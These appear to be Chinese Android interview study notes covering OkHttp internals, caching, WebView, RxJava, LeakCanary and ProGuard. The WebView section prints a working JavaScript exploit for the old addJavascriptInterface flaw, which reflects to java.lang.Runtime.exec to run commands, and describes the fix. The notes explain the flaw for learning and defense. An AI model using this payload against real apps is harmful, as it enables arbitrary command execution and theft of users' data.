| 字段名           | 意义                       |
| ------------- | ------------------------ |
| age           | 缓存已经存在的时间                |
| date          | 服务器返回时间                  |
| Expires       | 优先判断，本地数据时间是否超过该时间，超过再请求 |
| Last-Modified | 最后修改时间                   |
| ETag          | 最后标识                     |
|               |                          |

```
  //now - sent + age + 0 < max-age + 0
```

1.没有缓存直接请求

2.客户端策略，是否强制使用/不适用缓存

3.计算age+now-sent < max-age,满足就使用缓存，缓存没有过期

4.判断客户端是否有etag，则携带if-not-match

   判断客户端是否有last-modified，则携带If-Modified-Since

## 算法

###排序算法



## 设计模式

[简单工厂模式（SimpleFactoryPattern）- 最易懂的设计模式解析](https://www.jianshu.com/p/e55fbddc071c)
[工厂方法模式（Factory Method）- 最易懂的设计模式解析](https://www.jianshu.com/p/d0c444275827)
[抽象工厂模式（Abstract Factory）- 最易懂的设计模式解析](https://www.jianshu.com/p/7deb64f902db)

### 常见及类型及demo



## 项目

###网络

**okhttp：**

![img](https://upload-images.jianshu.io/upload_images/1916953-fc6439af2bfefddc.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/685)



RetryAndFollowUpInterceptor

- 会根据客户端请求Request以及OkHttpClient，创建出StreamAllocation，它主要用于管理客户端与服务器之间的连接，同时管理连接池，以及请求成功后的连接释放等操作

- StreamAllocation的构造方法，观察此构造方法可以看出，StreamAllocation创建时，又根据Address，创建了一个路由选择器RouteSelector，

- while循环，在这个循环中，首先会进行一个安全检查操作，检查当前请求是否被取消，如果这时请求被取消了，则会通过StreamAllocation释放连接，并抛出异常

- RealInterceptorChain的proceed方法处理请求，在请求过程中，只要发生异常，**调用recover**

  **判断是否可以重试**，如果可以则continental，否则releaseConnection就会为true，一旦变为true，就会将StreamAllocation释放掉

- 如果这时没有产生异常情况，接下来则会通过响应Response来执行followUpRequest方法，来检查是否需要进行重定向操作。当不需要进行重新定向操作时，就会直接返回Response

- 需要重定向：（根绝返回码来处理）followUpRequest，在返回头的Location字段
  - 校验两个信息
  - 根据重定向请求followUp，与当前的响应进行对比，检查是否同一个连接。一般来说都是需要新的连接，新建一个StreamAllocation，并重修赋值request
  - 开始下一轮责任链执行




**BridgeInterceptor**

负责把用户构造的请求转换为发送到服务器的请求、把服务器返回的响应转换为用户友好的响应的 。

- 对request进行处理，添加一些请求头信息 content-type之类的

- 调用后置拦截器发起网络请求，得到的响应可能是缓存的，也可能是服务器返回的最新数据

- 对response进行处理 ，如果服务器支付higZip压缩，那么就对返回结果进行解压缩。（保存cookie？）

  ​

**CacheInterceptor**

**强制缓存**：如果生效需要再和服务器发生交互，

**对比缓存**：不管是否生效，都需要与服务端发生交互。浏览器第一次请求数据时，服务器会将缓存标识与数据一起返回给客户端，客户端将二者备份至缓存数据库中。
再次请求数据时，客户端将备份的缓存标识发送给服务器，服务器根据缓存标识进行判断，判断成功后，返回304状态码，通知客户端比较成功，可以使用缓存数据。，服务端在进行标识比较后，只返回header部分，通过状态码通知客户端使用缓存，不再需要将报文主体部分返回给客户端。

**强制缓存优先级高于对比缓存，也就是说，当执行强制缓存的规则时，如果缓存生效，直接使用缓存，不再执行对比缓存规则。**



对比缓存：第一次返回**Last-Modified**，请求时携带**If-Modified-Since**

**Etag  /  If-None-Match**（优先级高于Last-Modified  /  If-Modified-Since）

![img](https://images2015.cnblogs.com/blog/632130/201702/632130-20170210141453338-1263276228.png)



第一个是否过期使用Cache-control的 max-age 进行比较

如果返回的消息中，同时出现了Cache-control: max-age和Expires，那么以Cache-control: max-age为准，Expires的声明将会被覆盖掉。





- 如果在初始化OkhttpClient的时候配置缓存，则从缓存中取caceResponse 
- 将当前请求request和caceResponse 构建一个CacheStrategy对象 
- CacheStrategy这个策略对象将根据相关规则来决定caceResponse和Request是否有效，如果无效则分别将caceResponse和request设置为null 
- 经过CacheStrategy的处理(步骤3），如果request和caceResponse都置空，直接返回一个状态码为504，且body为Util.EMPTY_RESPONSE的空Respone对象 
- 经过CacheStrategy的处理(步骤3），resquest 为null而cacheResponse不为null，则直接返回cacheResponse对象 
- 执行下一个网络请求
- 如果服务器资源没有过期（状态码304）且存在缓存，则返回缓存 
- 否则将网络返回的最新的资源（networkResponse）缓存到本地，然后返回networkResponse. 



**ConnectionIncterceptor**

**打开了与服务器的链接，正式开启了网络请求**

StreamAllocation

1.使用了Okhttp的连接池**ConnectionPool** ，在okhttp的builder时创建，instance是在static代码块 初始化
2.通过url创建了一个Address对象。 



newStream：

1）从缓冲池ConnectionPool获取一个RealConnection对象，如果缓冲池里面没有就创建一个RealConnection对象并且放入缓冲池中，具体的说是放入ConnectionPool的ArrayDeque队列中。

2）获取RealConnection对象后并调用其connect**打开Socket链接**

newstream - >findHealtrhyConnection

1、开启一个while循环，调用findConnection继续获取RealConnection对象candidate 。 
2、如果candidate 的successCount 为0，直接返回之，while循环结束 
3、如果candidate是一个不“健康”的对象，则对此对象进行调用noNewStreams进行销毁处理，继续循环调用findConnection获取RealConnection对象。

（注：不健康的RealConnection条件为如下几种情况： 
RealConnection对象 socket没有关闭 
socket的输入流没有关闭 
socket的输出流没有关闭 
http2时连接没有关闭 
）

newstream - >findHealtrhyConnection ->findConnection

1、StreamAllocation的connection能复用就复用之 
2、如果connection不能复用，则从连接池中获取RealConnection，获取成功则返回，从连接池中获取RealConnection的方法调用了两次 
,第一次没有传Route,第二次传了（这个坑以后讲解） 
3，如果连接池里没有则neｗ一个RealConnection对象，并放入连接池中 
4.最终调用RealConnection的connect方法打开一个socket链接（此处暂且说结论，至于为何断定是socket链接，篇幅有限另外结合别的知识点另开博文说明）。



**NetWorkInterceoption**

手动添加？？

**CallServerInterceptor**

**向服务器发送请求，并最终返回Response对象供客户端使用**

- writeRequest：Okhttp通过OkIO的Sink对象（该对象可以看做Socket的OutputStream对象）的writeRequest来向服务器发送请求的。

- 判断请求头中是否有“100 continue”的作用就是：客户端有一个RequestBody(比如post或者PUT方法)要发给服务器，但是客户端希望在发送RequestBody之前查看服务器是否接受这个body,服务端在接受到这个请求后必须进行响应。

  因此如果有，需要先发送一下

- 如果服务器返回100 continue则准备继续写入包体

- 发送请求体

- 读取请求头

- 读取请求包  （realResponseBody 没有直接的内容，内部维护了一个Source封装对象）




**返回数据不能读取两次：**

那么我们怎么通过这个body来获取服务器发送过来的字符串呢？ResponseBody提供了string()方法：

```
  public final String string() throws IOException {
    BufferedSource source = source();
    try {
      Charset charset = Util.bomAwareCharset(source, charset());
      //InputStream 读取数据
      return source.readString(charset);
    } finally {
      Util.closeQuietly(source);
    }
  }12345678910
```

string(）方法也很简单，就是通过一些处理然后让调用source.readString来读取服务器的数据。需要注意的是该方法最后调用closeQuietly来关闭了当前请求的InputStream输入流，所以string()方法只能调用一次,再次调用的话会报错，毕竟输入流已经关闭了，你还怎么读取数据呢？




**连接池原理：**ConnectionPool连接池复用技术，异步请求线程池

ConnectionPool持有一个静态的线程池。

findConnection -> Internal.instance.put(connectionPool, result);

执行一个runable executor.execute(cleanupRunnable);

```
cleanup：
```

遍历每一个RealConnection，通过引用数目确定哪些是空闲的，哪些是在使用中，同时找到空闲时间最长的RealConnection。

如果空闲数目超过最大空闲数或者空闲时间超过最大空闲时间，则清理掉这个RealConnection，并返回0，表示需要立刻再次清理

否则如果空闲的数目大于0个，则等待最大空闲时间-已有的最长空闲时间

否则如果使用中的数目大于0，则等待最大空闲时间

否则 返回 -1，并标识退出清除状态



同时如果某个RealConnection空闲后，会进入ConnectionPool.connectionBecameIdle方法,如果不可被复用，则被移除，否则立刻唤醒上面cleanUp的wait，再次清理，因为可能超过了最大空闲数目

这样通过一个静态的线程池，ConnectionPool做到了每个实例定期清理，保证不会超过最大空闲时间和最大空闲数目的策略。



**连接池复用技术**

``keep-alive`` 就是浏览器和服务端之间保持长连接，这个连接是可以复用的。在HTTP1.1中是默认开启的。

为什么要使用连接池复用？

在高并发的请求连接情况下或者同个客户端多次频繁的请求操作，无限制的创建会导致性能低下。

如果使用keep-alive在`timeout`空闲时间内，连接不会关闭，相同重复的request将复用原先的`connection`，减少握手的次数，大幅提高效率。

> 并非`keep-alive`的timeout设置时间越长，就越能提升性能。长久不关闭会造成过多的僵尸连接和泄露连接出现。

**原理：**

- excutor : 线程池，用来检测闲置socket并对其进行清理。
- connections : connection缓存池。Deque是一个双端列表，支持在头尾插入元素，这里用作LIFO（后进先出）堆栈，多用于缓存数据。  ArrayDeque
- routeDatabase ：用来记录连接失败router

添加缓存操作：

在放入新的连接之前，先开启线程执行清理操作

获取缓存操作

遍历connections缓存列表，当某个连接计数的次数小于限制的大小以及request的地址和缓存列表中此连接的地址完全匹配。则直接复用缓存列表中的connection作为request的连接。



每一个connection内都有一个 List<Reference<StreamAllocation>> allocations 列表

connection活跃情况的 >0表示活跃 =0 表示空闲 

`StreamAllocation`被高层反复执行`aquire`与`release`。这两个函数在执行过程中其实是在一直在改变`Connection`中的 `List<WeakReference<StreamAllocation>>`大小。



**异步请求**

内部维护一个线程池，有两个Deque，分别维护准备队列和运行中队列

在任务执行完毕后，会调用finish，在finish中会尝试将准备队列中的数据移动到运行队列，并execute



**为什么要使用Deque？？**





**两种自定义拦截器的区别**

interceptors ： 自定义拦截器， addInterceptor

networkInterceptors ： 网络类型的拦截器，addNetworkInterceptor

![img](https://upload-images.jianshu.io/upload_images/2173870-82a5eace3bd9f88c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)



**缓存策略**

**OkHttpClient构造时设置缓存路径：**

其中以.0结尾的文件缓存了http的响应头信息，以.1结尾的文件则缓存了我们下载的json数据，journal则是一个日志文件

这个0/1 的文件名是对url进行md5之后的得到的字符串

**构造CacheControl**

1.  //不使用缓存，但是会保存缓存数据  
2.  ​                //.noCache()  
3.  ​                //不使用缓存，同时也不保存缓存数据  
4.  ​               // .noStore()  
5.  ​                //只使用缓存，（如果我们要加载的数据本身就是本地数据时，可以使用这个，不过目前尚未发现使用场景）  
6.  ​                //.onlyIfCached()  
7.  ​                //手机可以接收响应时间小于当前时间加上10s的响应  
8.  //                .minFresh(10,TimeUnit.SECONDS)  
9.  ​                //手机可以接收有效期不大于10s的响应  
10.  //                .maxAge(10,TimeUnit.SECONDS)  





Lru的使用**

缓存文件使用了LRU策略

CacheInterceptor -> Cache.internalCache  (我们也可以实现这个接口来自定义缓存)->DiskLruCache - >SystermFile  -> Okio





**OkHttp对于网络请求都有哪些优化，如何实现的**

1.重试和重定向

2.桥接层可以自动配置请求头信息

3.缓存层，缓存策略，自动校验缓存有效期，并对文件进行LRU缓存

4.链接层：复用链接池结束，减少网络简介开销

5.请求层：直接使用Socket，减少了HttpUrllconnectuion这一层面封装带来的消耗



6.异步请求时，维护线程池及两个请求队列，可以很好地管理线程和请求的队列阻塞

**OkHttp框架中都用到了哪些设计模式**

- 构造者模式

- 责任链

- 工厂模式  缓存策略

  ​

retrofit







## Https



## [内存管理](https://github.com/LRH1993/android_interview/blob/master/operating-system/memory-management.md)



## [SQL语句](https://github.com/LRH1993/android_interview/blob/master/sql/SQL.md)



###架构

###底层应用



http://lib.csdn.net/article/computernetworks/20534



https://wenku.baidu.com/view/2e922d23591b6bd97f192279168884868762b8f2.html



解读：选取一个自己最熟悉的项目讲解，按照STAR法则复述情境(situation)、任务(task)、行动(action)、结果(result)，在体现自己能力的地方时重点描述。主要是想了解你在该项目中承担的角色、任务以及工作成果。



window：

windowManager是个接口->windowmanagerImpl ->委托给WindowManagerGlobal

- 参数合法校验
- 构造viewrootimpl，并添加到   view列表  viewrootimpl列表   param列表
- viewrootimpl.setview ->requestlayout-> sheduleTraversals->performTraversals(onmeasue.onlayout)->windowsession->addtodiaplayremoveView(onDraw)


- 找到view 索引
- 插入到mDyingViews
- 垃圾回收
- windowSession remove
- onDetachedFromWindow
- doremove  从列表移除

update

更新param，重新scheduleTraversal





Activity：

- Activity attach 时构造phonewindow


- setContentView ，初始化decorview；将view添加到contentParent中；回调onContentChanged
- onResume 时makeVisible  addView



Dialog必须要使用Activity的context，因为token只有activity有，系统除外



Toast

- NMS ->enqueueToast ： 加入到队列，最多50个
- NMS ->showNextToast ->回调TN来进行展示TN.show
- NMS ->发送延时消息隐藏和移除队列 TN.hide
- ​




### **webView**

Cookie

```java
	            String c = CookieManager.getInstance().getCookie(url);  
```





#### WebView 任意代码执行漏洞

出现该漏洞的原因有三个：

- WebView 中 `addJavascriptInterface（）` 接口
- WebView 内置导出的 `searchBoxJavaBridge_`对象
- WebView 内置导出的 `accessibility` 和 `accessibilityTraversal`Object 对象

具体获取系统类的描述：（结合 Java 反射机制）

- Android中的对象有一公共的方法：getClass() ；
- 该方法可以获取到当前类 类型Class
- 该类有一关键的方法： Class.forName；
- 该方法可以加载一个类（可加载 java.lang.Runtime 类）
- 而该类是可以执行本地命令的

以下是攻击的Js核心代码：

```
function execute(cmdArgs)  
{  
    // 步骤1：遍历 window 对象
    // 目的是为了找到包含 getClass （）的对象
    // 因为Android映射的JS对象也在window中，所以肯定会遍历到
    for (var obj in window) {  
        if ("getClass" in window[obj]) {  

      // 步骤2：利用反射调用forName（）得到Runtime类对象
            alert(obj);          
            return  window[obj].getClass().forName("java.lang.Runtime")  

      // 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令
getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  

// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。
// 如执行完访问文件的命令之后，就可以得到文件名的信息了。
        }  
    }  
}   
```

#### 2.1.2 searchBoxJavaBridge_接口引起远程代码执行漏洞

#### A. 漏洞产生原因

- 在Android 3.0以下，Android系统会默认通过`searchBoxJavaBridge_`的Js接口给 WebView 添加一个JS映射对象：`searchBoxJavaBridge_`对象
- 该接口可能被利用，实现远程任意代码。

#### B. 解决方案

删除`searchBoxJavaBridge_`接口

```
// 通过调用该方法删除接口
removeJavascriptInterface（）；12
```

#### 2.1.3 `accessibility`和 `accessibilityTraversal`接口引起远程代码执行漏洞

同上





Android  4.2 以后才加上了javaScriptInterface 注解



webView.setWebViewClient(  )  

- shouldOverrideUrlLoading
- onPageStart

WebView.setChromeClient()

- onJsAlert
- onJsConfirm
- onJsPrompt



4.2以下我们可以利用jsPrompt 来解决js调用客户端

http://blog.csdn.net/u012971339/article/details/50770854

jsBridge 矿机实现原理





### ListView 滚动优化：

- AbsListView.OnScrollListener接口



### 埋点：

**声明式埋点**：

在Android中，我们自定义了常用的UI控件，例如TextView、LinearLayout、ListView、ViewPager等，重写了事件响应方法，在这些方法内部自动填写埋点代码。重写控件的好处在于可以拦截到更多的事件，执行效率高并且运行稳定。但其弊端也非常明显——移植成本很高！

为了解决这个问题，我们借鉴了[Android v7支持库](https://developer.android.com/topic/libraries/support-library/features.html)的思路，即通过AppCompatDelegate代理自动替换UI控件。

```
public class GAAppCompatDelegateV14 extends AppCompatDelegateImplV14 {
    @Override
    View callActivityOnCreateView(View parent, String name, Context context, AttributeSet attrs) {
        switch (name) {
            case "TextView":
                return new NovaTextView(context, attrs);
        }
        return super.callActivityOnCreateView(parent, name, context, attrs);
    }
}
```

这样，开发者只需要在自己的Activity基类中重写getDelegate方法，将方法的返回值替换为修改过的AppCompatDelegate，就可以实现自动替换UI控件了。

```
@Override
public AppCompatDelegate getDelegate() {
    if (mDelegate == null) {
        mDelegate = GAAppCompatUtil.create(this, this);
    }
    return mDelegate;
}
```

如果引用的第三方库中重写了UI控件，上述方法是不生效的，也就是说我们需要一种替换UI控件类的父类方法。可是在运行时，我们没有找到可行的替换UI控件类的父类方法。因此，我们尝试在编译时修改父类，并开发了一个Gradle插件。事实上，这样做并不存在运行时效率的问题，只是会牺牲一些编译速度。这样开发者只需要运行这个插件，就可以实现自动将UI控件的父类替换为我们重写的UI控件了。（把第三方控件的父类动态修改为我们的自定义类）

```
apply plugin: 'com.meituan.judasplugin'
```

采用了声明式埋点后，只需要在控件初始化时声明一下需要的埋点就可以了。我们不必再侵入程序的各种响应函数，降低了埋点的难度。

```
GAHelper.bindClick(view, bid, lab);
```

### **无痕埋点**

我们注意到，之所以声明式埋点还需要写死代码，主要有两个原因：第一是需要声明埋点控件的唯一事件标识，即bid；第二是有的业务字段需要在前端埋点时携带，而这些字段是在运行时才可获知的值。














rxjava

​	抗压   响应式拉取，，，，》？？

https://mp.weixin.qq.com/s?__biz=MzIwMzYwMTk1NA%3D%3D&mid=2247484765&idx=1&sn=518fbb085cda7ed7718ca101c286814b&chksm=96cda410a1ba2d061e8cb42503625c6f11ed9bfc6d2c1d118101b85c9cfe45409be12325e78f

gradle 3.0 改进

引入complementation ，废弃compile

- api：和 compile 的作用一样，当前 module 会暴露其依赖的其他 module 内容。
- implementation：只在内部使用了该 module，不会向外部暴露其依赖的 module 内容







**Observable的创建：**

```
Observable<String> observable = Observable.create(new ObservableOnSubscribe<String>() {
            @Override
            public void subscribe(ObservableEmitter<String> e) throws Exception {
                //执行一些其他操作
                //.............
                //执行完毕，触发回调，通知观察者
                e.onNext("我来发射数据");
            }
        });

```

**Observer的创建：**

```
Observer<String> observer = new Observer<String>() {
            @Override
            public void onSubscribe(Disposable d) {

            }

            @Override
            //观察者接收到通知,进行相关操作
            public void onNext(String aLong) {
                System.out.println("我接收到数据了");
            }

            @Override
            public void onError(Throwable e) {

            }

            @Override
            public void onComplete() {

            }
        };

```

**订阅：**

```
 observable.subscribe(observer);
```

**just()方式**
`Observable<String> observable = Observable.just("Hello");`

直接发送数据

**map()操作符**

ap()操作符，就是把原来的Observable对象转换成另一个Observable对象，同时将传输的数据进行一些灵活的操作，方便Observer获得想要的数据形式。

map返回的是结果集，flatmap返回的是包含结果集的Observable（返回结果不同）

map被订阅时每传递一个事件执行一次onNext方法，flatmap多用于多对多，一对多，再被转化为多个时，一般利用from/just进行一一分发，被订阅时将所有数据传递完毕汇总到一个Observable然后一一执行onNext方法（执行顺序不同）>>>>(如单纯用于一对一转换则和map相同)

**filter()操作符**

过滤得到需要的数据

take()操作符：输出最多指定数量的结果。



### Scheduler

**●Schedulers.newThread():** 总是启用新线程，并在新线程执行操作。

**●Schedulers.io():** I/O 操作（读写文件、读写数据库、网络信息交互等）所使用的 Scheduler。

● Android 还有一个专用的** AndroidSchedulers.mainThread()**，它指定的操作将在 Android 主线程运行。





### Flowable

在RxJava中会经常遇到一种情况就是被观察者发送消息十分迅速以至于观察者不能及时的响应这些消息。

，即：Backpressure(背压)。所谓背压，即生产者的速度大于消费者的速度带来的问题。

request（n) 可以定义每次拉取多少个

##### ERROR

##### BUFFER

#### DROP



## Android 项目：



**IOC：**

控制反转



运行时注入

编译时注入

Butterknife

Dagger



**AOP 架构设计**

面向切面编程



## 源码需要注意

- PackageManager
- ListView 复用机制
- 属性动画源码

## MVVM 编译时原理剖析 、MVC、MVP





图片加载框架设计



RXJAVA 响应式相关



sqlite：

**首先获取数据库的当前版本，当版本号为0的时候，就会执行onCreate方法(当数据库文件第一次创建的时候版本号就是0)**如果版本号不为0，同时和最新版本号进行比较，如果大于的话，就执行升级操作onUpgrade方法，否则就执行降级onDowngrade方法，不过降级方法实现很简单:、

第一次运行代码才会执行onCreate；

之后会执行onUpgrade或者onDowngrade；



LeakCanary 源码解读

- 入口

  Application.registerActivityLifecycleCallbacks

  LeakCanay的自动检测泄漏是在4.0之上的，用了Application的ActivityLifecycleCallbacks回调接口中的onDestory()回调实现对项目中的activity进行对象监听，然后交给RefWatcher监听类进行进一步处理。

- 如何判断泄漏

- 内存快照的处理

- 总结拓展\

```
 //它首先会向主线程的 MessageQueue 添加一个 IdleHandler。
   //执行postToBackgroundWithDelay()方法
   void waitForIdle(final Retryable retryable, final int failedAttempts) {
       Looper.myQueue().addIdleHandler(new IdleHandler() {
           public boolean queueIdle() {
               AndroidWatchExecutor.this.postToBackgroundWithDelay(retryable, failedAttempts);
               return false;// 只执行一次
           }
       });
   }
```

什么是 IdleHandler？我们知道 Looper 会不断从 MessageQueue 里取出 Message 并执行。当没有新的 Message 执行时，Looper 进入 Idle 状态时，就会取出 IdleHandler 来执行。

换句话说，IdleHandler就是 优先级别较低的 Message，只有当 Looper 没有消息要处理时才得到处理。而且，内部的 queueIdle() 方法若返回 true，表示该任务一直存活，每次 Looper 进入 Idle 时就执行；反正，如果返回 false，则表示只会执行一次，执行完后丢弃。



常用的是常用的触发 gc 方法是 System.gc()，那它能达到我们的要求吗？

从代码也能看出，必须先判断 shouldRunGC 才能决定是否真的要 gc。

那要怎么实现 即时 GC 呢？

直接调用            Runtime.getRuntime().gc();





proguard：

![img](http://img.blog.csdn.net/20170327171156883)

ProGuard 能够对 Java 类中的代码进行压缩（Shrink），优化（Optimize），混淆（Obfuscate），预检（Preveirfy）。

- 压缩（Shrink）：检测和删除没有使用的类，字段，方法和属性。
- 优化（Optimize）：对字节码进行优化，并且移除无用指令。
- 混淆（Obfuscate）：使用 a，b，c 等无意义的名称，对类，字段和方法进行重命名。
- 预检（Preveirfy）：主要是在 Java 平台上对处理后的代码进行预检。

每次构建时 ProGuard 都会输出下列文件：

```
dump.txt
```

 说明 APK 中所有类文件的内部结构。

```
mapping.txt
```

 提供原始与混淆过的类、方法和字段名称之间的转换。

```
seeds.txt
```

 列出未进行混淆的类和成员。

```
usage.txt
```

列出从 APK 移除的代码。

文件位置：  主工程\build\outputs\mapping\release





Handler .postDelay

计算出目标时间when，然后再get出message后会计算出还要等待时间，如果还要等待则调用nativePollOnce，进行阻塞。`nativePollOnce()`的作用类似与`object.wait()`，只不过是使用了Native的方法对这个线程精确时间的唤醒。



现在整个调用流程就比较清晰了，以刚刚的问题为例：

1. `postDelay()`一个10秒钟的Runnable A、消息进队，MessageQueue调用`nativePollOnce()`阻塞，Looper阻塞；
2. 紧接着`post()`一个Runnable B、消息进队，判断现在A时间还没到、正在阻塞，把B插入消息队列的头部（A的前面），然后调用`nativeWake()`方法唤醒线程；
3. `MessageQueue.next()`方法被唤醒后，重新开始读取消息链表，第一个消息B无延时，直接返回给Looper；
4. Looper处理完这个消息再次调用`next()`方法，MessageQueue继续读取消息链表，第二个消息A还没到时间，计算一下剩余时间（假如还剩9秒）继续调用`nativePollOnce()`阻塞；
5. 直到阻塞时间到或者下一次有Message进队；

MessageQueue会根据post delay的时间排序放入到链表中，链表头的时间小，尾部时间最大。因此能保证时间Delay最长的不会block住时间短的。当每次post message的时候会进入到MessageQueue的next()方法，会根据其delay时间和链表头的比较，如果更短则，放入链表头，并且看时间是否有delay，如果有，则block，等待时间到来唤醒执行，否则将唤醒立即执行。

所以handler.postDelay并不是先等待一定的时间再放入到MessageQueue中，而是直接进入MessageQueue，以MessageQueue的时间顺序排列和唤醒的方式结合实现的。使用后者的方式，我认为是集中式的统一管理了所有message，而如果像前者的话，有多少个delay message，则需要起多少个定时器。前者由于有了排序，而且保存的每个message的执行时间，因此只需一个定时器按顺序next即可。





***res/raw和assets的相同点：**

1.两者目录下的文件在打包后会原封不动的保存在apk包中，不会被编译成二进制。

*res/raw和assets的不同点：
1.res/raw中的文件会被映射到R.java文件中，访问的时候直接使用资源ID即R.id.filename；assets文件夹下的文件不会被映射到R.java中，访问的时候需要AssetManager类。
2.res/raw不可以有目录结构，而assets则可以有目录结构，也就是assets目录下可以再建立文件夹

*读取文件资源：

1.读取res/raw下的文件资源，通过以下方式获取输入流来进行写操作

[view plain](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)[copy to clipboard](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)[print](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)[?](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)

- InputStream is = getResources().openRawResource(R.raw.filename);  

2.读取assets下的文件资源，通过以下方式获取输入流来进行写操作

[view plain](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)[copy to clipboard](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)[print](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)[?](http://blog.csdn.net/zuolongsnail/archive/2011/05/25/6444806.aspx#)

- AssetManager am = **null**;  
- am = getAssets();  
- InputStream is = am.open("filename");  

# Android线程间通讯的几种方式

runOnUiThread

handler

asyncTask







\1. GET使用URL或Cookie传参。而POST将数据放在BODY中。

\2. GET的URL会有长度上的限制，则POST的数据则可以非常大。

\3. POST比GET安全，因为数据在地址栏上不可见。





https

1.客户端请求

2.服务端产生随机数，返回证书

3.客户端校验证书，生成随机数

4.客户端公钥加密随机数（基于服务端随机数）

5.服务端私钥解析随机数

6.到这里客户端和服务端都拿到了这样一个随机数，接下来就用这个随机数进行对称加密













上传机制：

1.收到崩溃广播，延迟1-5s开始上传

2.用户启动开始检查本地触发上传

3.开发者手动调用上传





数据库：

- 数据格式统一
- 便于管理检索，增删查改



文件：

数据量大，格式无要求，难以管理和维护





ddos：

syn，

大量同时请求



防范：

增大抗压量

封锁ip或者异常流量

DNS隐藏真实ip

